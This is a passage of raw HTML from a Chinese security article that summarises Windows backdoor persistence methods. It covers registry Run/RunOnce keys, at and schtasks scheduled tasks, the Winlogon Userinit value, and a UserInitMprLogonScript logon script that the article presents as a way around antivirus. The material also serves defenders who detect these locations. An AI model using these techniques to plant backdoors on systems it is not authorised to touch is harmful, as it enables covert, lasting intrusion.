&quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.4657960199004975" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/5_jICUSwOzIftibGvPnUl9h46XYWsGLA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUg2vbAne9zBibOI1KqJOKL06RPpHjICUSwOzIftibGvPnUl9h46XYWsGLA/640?wx_fmt=png'" data-type="png" data-w="1608"  /></p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">注册表自启动项</span></h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">MSF</span></code><span style="font-size:15px;line-height:35px;;">的</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">Persistence</span></code><span style="font-size:15px;line-height:35px;;">模块利用的就是写注册表自启动项来实现的，一般自启动项是这两个键：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">Run</span></code><span style="font-size:15px;line-height:35px;;">和</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">RunOnce</span></code><span style="font-size:15px;line-height:35px;;">，两者的区别如下</span></p><ol style="" class=" list-paddingleft-2"><li><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">Run：该项下的键值即为开机启动项，每一次随着开机而启动。</span></p></li><li><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除</span></p></li></ol><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">常见注册表启动项键的位置：</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">用户级</span></p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run<br  />\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">系统级</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br  />\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce<br  />\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run<br  />\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">修改一下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.47780517879161527" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/6_ribPzmxBtSjC0ycM8BkGmCj4ZgHdww.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgzZuxAsZnaSPxMPDicdzjSiaBE2oribPzmxBtSjC0ycM8BkGmCj4ZgHdww/640?wx_fmt=png'" data-type="png" data-w="1622"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">执行结果<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/7_YEIXCXPez4rwPXMaSsIwflickuEj4Q.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgKOd6AeUJbsenI1vBALHFWVmQaYEIXCXPez4rwPXMaSsIwflickuEj4Q/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">定时任务</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">windows下定时任务的命令有两个分别是：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">at</code>和<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">schtasks</code>，他们两者主要区别是<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">at</code>命令在<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">win7</code>、<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">08</code>等高版本的windows中是不能将任务在前台执行的，也就是只会打开一个后台进程，而<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">schtasks</code>是将定时的任务在前台执行，下面我们逐个看看</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">at</code>的一些参数</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">AT [\\computername] time [/INTERACTIVE]<br  />    [ /EVERY:date[,...] | /NEXT:date[,...]] "command"</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">at</code>的执行如下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/8_VN3gD6lEGQRPzQT0fuystzZiamd2tQ.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgSEwQwbYibRdPAkHL0ciczgM6Kn9VN3gD6lEGQRPzQT0fuystzZiamd2tQ/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">schtasks</code>一些参数：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">schtasks /create /tn TaskName /tr TaskRun /sc schedule [/mo modifier] [/d day] [/m month[,month...] [/i IdleTime] [/st StartTime] [/sd StartDate] [/ed EndDate] [/s computer [/u [domain\]user /p password]] [/ru {[Domain\]User | "System"} [/rp Password]] /?</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">schtasks</code>的执行如下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/9_419xibJ1e0d3UUewtwjYR1b5DlgPvQ.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgzd1KQCGia73GtV22icNcSFLlYVa419xibJ1e0d3UUewtwjYR1b5DlgPvQ/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">用户登陆初始化</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Userinit</code>的作用是用户在进行登陆初始化设置时，<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">WinLogon</code>进程会执行指定的<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">login scripts</code>，所以我们可以修改它的键值来添加我们要执行的程序</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">注册表路径为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code>，我们添加一个我们启动的程序，多个程序用逗号隔开</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5512431776834446" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/10_dyoIu2Y0tQ326p7Pamdg1J0j0o7gCw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgZ9LVX1FQg9Xw3ApkMDdA1aSHdyoIu2Y0tQ326p7Pamdg1J0j0o7gCw/640?wx_fmt=png'" data-type="png" data-w="1649"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下：</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.573810994441013" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/11_YD3FXSXk4jEDG6ico6pmEDoCpY4Esg.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgJsuNB1atZkeONdQIGqXdpXw72YD3FXSXk4jEDG6ico6pmEDoCpY4Esg/640?wx_fmt=gif'" data-type="gif" data-w="1619"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Logon Scripts</span></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">Logon Scripts</code>优先于av先执行，我们可以利用这一点来绕过av的敏感操作拦截</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">注册表路径为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_CURRENT_USER\Environment</code>，创建一个键为：<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">UserInitMprLogonScript</code>，其键值为我们要启动的程序路径</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5168471720818292" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/12_Xjl5BpiceibZZW8blyI8iaa2KI8Bqw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgibwm90JJ8PbOvoSjfG4qyIvcpLYYXjl5BpiceibZZW8blyI8iaa2KI8Bqw/640?wx_fmt=png'" data-type="png" data-w="1662" 